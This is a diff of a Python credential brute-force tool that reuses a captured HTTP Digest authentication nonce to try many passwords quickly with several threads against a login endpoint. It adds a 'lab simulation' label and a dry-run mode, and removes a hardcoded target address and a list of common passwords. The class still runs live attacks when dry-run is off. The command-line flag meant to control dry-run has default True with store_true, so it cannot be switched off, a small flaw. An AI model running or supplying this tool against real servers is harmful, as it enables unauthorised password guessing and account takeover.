@@ -1,7 +1,11 @@
 #!/usr/bin/env python3
 """
-HTTP Digest Authentication Nonce Reuse Attack Tool
-Captures a nonce and reuses it rapidly for multiple authentication attempts to test for nonce reuse vulnerabilities.
+HTTP Digest Authentication Nonce Reuse Attack Tool (Lab Simulation)
+Purpose: Demonstrate digest nonce reuse behavior in a safe lab environment.
+Usage:
+    python digest_nonce_reuse.py --dry-run --url http://localhost:8082/digestauth --user testuser --passwords file.txt
+Example:
+    python digest_nonce_reuse.py --dry-run
 """
 
 import requests
@@ -10,29 +14,19 @@ import time
 import re
 import threading
 import queue
+import argparse
 
 class DigestBurstAttacker:
-    def __init__(self, url=None, username=None, password_list=None):
+    def __init__(self, url=None, username=None, password_list=None, dry_run=True):
         self.url = url if url else 'http://localhost/digestauth'
         self.username = username if username else 'testuser'
         self.session = requests.Session()
+        self.dry_run = dry_run
         
         # This list should be populated from external sources (e.g., wordlists, cracked passwords)
         self.passwords = password_list if password_list else []
         
-        # Example of how to populate if needed for testing (remove for production)
-        # self.passwords = [
-        #     'passw0', 'a1b2c3', 'trusty', 'qwerty', '1q2w3e',
-        #     'letme1', 'admin1', 'test12', 'qwert1',
-        #     'B12345', 'P12345', '312345', 'v12345', 'e12345',
-        #     '123456', 'abc123', 'password', 'admin1', 'test12',
-        #     'qazwsx', 'asdfgh', 'zxcvbn', 'yuiop1',
-        #     'secure', 'system', 'access', 'secret',
-        #     '111111', '222222', '333333', '123123',
-        # ]
-        
         # Filter passwords to ensure they meet common digest authentication criteria (e.g., 6-char alphanumeric)
-        # This constraint is based on a common scenario, adjust as needed for specific targets
         seen = set()
         filtered = []
         for p in self.passwords:
@@ -43,6 +37,8 @@ class DigestBurstAttacker:
         
     def get_digest_challenge(self):
         """Get fresh digest challenge"""
+        if self.dry_run:
+            return {"realm": "lab", "nonce": "deadbeef", "qop": "auth", "algorithm": "MD5"}
         try:
             response = self.session.get(self.url, timeout=5)
             if response.status_code == 401:
@@ -127,6 +123,8 @@ class DigestBurstAttacker:
     
     def test_password_with_challenge(self, challenge, password):
         """Test a password with existing challenge"""
+        if self.dry_run:
+            return 401, 0
         try:
             auth_header = self.create_digest_response(challenge, password)
             
@@ -161,7 +159,7 @@ class DigestBurstAttacker:
                     break
                 
                 password_queue.task_done()
-                time.sleep(0.1)  # Small delay to avoid overwhelming server
+                time.sleep(0.1)
                 
             except queue.Empty:
                 break
@@ -171,7 +169,8 @@ class DigestBurstAttacker:
     
     def run_burst_attack(self, num_workers=3):
         """Run burst attack with multiple workers reusing same nonce"""
-        print("HTTP Digest Authentication Nonce Reuse Attack")
+        mode = "DRY-RUN" if self.dry_run else "ACTIVE"
+        print(f"HTTP Digest Authentication Nonce Reuse Attack ({mode})")
         print("=" * 50)
         
         if not self.passwords:
@@ -233,7 +232,7 @@ class DigestBurstAttacker:
                     success_found = True
                     break
                 elif isinstance(status, int):
-                    if tested_passwords % 10 == 0:  # Progress every 10 attempts
+                    if tested_passwords % 10 == 0:
                         elapsed = time.time() - start_time
                         rate = tested_passwords / elapsed if elapsed > 0 else 0
                         print(f"[{tested_passwords:3d}] Worker {worker_id}: {password} -> {status} ({rate:.1f} tests/sec)")
@@ -243,46 +242,35 @@ class DigestBurstAttacker:
             except queue.Empty:
                 continue
         
-        # Wait for workers to finish
         for worker in workers:
             worker.join(timeout=1)
         
         elapsed = time.time() - start_time
         print(f"\nBurst attack completed in {elapsed:.1f} seconds")
-        print(f"Tested {tested_passwords} passwords at {tested_passwords/elapsed:.1f} tests/sec")
-        
-        if success_found:
-            # Test access to protected content
-            print("\nTesting access to protected content...")
-            try:
-                # This part would require tracking the successful password more robustly
-                print("Protected content test would require successful password tracking")
-            except Exception as e:
-                print(f"Error testing protected content: {e}")
+        if elapsed > 0:
+            print(f"Tested {tested_passwords} passwords at {tested_passwords/elapsed:.1f} tests/sec")
         
         return success_found
 
-if __name__ == "__main__":
-    # Example usage:
-    target_url = 'http://192.168.100.103/digestauth' # Replace with actual target URL
-    target_username = 'testuser' # Replace with actual target username
-    
-    # Load passwords from a file or define them here
-    # For demonstration, using a small example list
-    test_passwords = [
-        'passw0', 'a1b2c3', 'trusty', 'qwerty', '1q2w3e',
-        'letme1', 'admin1', 'test12', 'qwert1',
-        'B12345', 'P12345', '312345', 'v12345', 'e12345',
-        '123456', 'abc123', 'password', 'admin1', 'test12',
-        'qazwsx', 'asdfgh', 'zxcvbn', 'yuiop1',
-        'secure', 'system', 'access', 'secret',
-        '111111', '222222', '333333', '123123',
-        'hakkis' # Example password that might be found
-    ]
 
-    attacker = DigestBurstAttacker(
-        url=target_url,
-        username=target_username,
-        password_list=test_passwords
-    )
-    success = attacker.run_burst_attack(num_workers=4)
+def _parse_cli_args():
+    parser = argparse.ArgumentParser(description="Digest nonce reuse demo (lab-only)")
+    parser.add_argument("--url", type=str, default="http://localhost:8082/digestauth")
+    parser.add_argument("--user", type=str, default="testuser")
+    parser.add_argument("--passwords", type=str, default="")
+    parser.add_argument("--dry-run", action="store_true", default=True)
+    parser.add_argument("--workers", type=int, default=3)
+    return parser.parse_args()
+
+
+if __name__ == "__main__":
+    args = _parse_cli_args()
+    pwds = []
+    if args.passwords:
+        try:
+            with open(args.passwords, "r", encoding="utf-8") as fh:
+                pwds = [line.strip() for line in fh if line.strip()]
+        except Exception as e:
+            print(f"Could not read passwords file: {e}")
+    attacker = DigestBurstAttacker(url=args.url, username=args.user, password_list=pwds, dry_run=args.dry_run)
+    attacker.run_burst_attack(num_workers=args.workers)
